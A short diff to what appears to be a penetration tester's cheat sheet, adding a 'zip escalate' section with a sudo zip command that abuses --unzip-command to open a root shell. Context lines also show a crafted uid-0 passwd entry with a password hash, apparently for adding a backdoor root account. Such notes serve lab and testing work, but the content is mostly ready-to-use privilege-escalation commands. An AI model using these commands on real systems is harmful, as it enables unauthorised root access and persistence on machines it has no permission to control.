@@ -16,6 +16,11 @@ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
  scp username@remote.example.com:/remote/directory/a.txt /local/directory
 ```
 
+## zip escalate
+```
+sudo zip filename.zip filename.txt -T --unzip-command="sh -c /bin/bash"
+```
+
 
 ## sudo enum
 ```
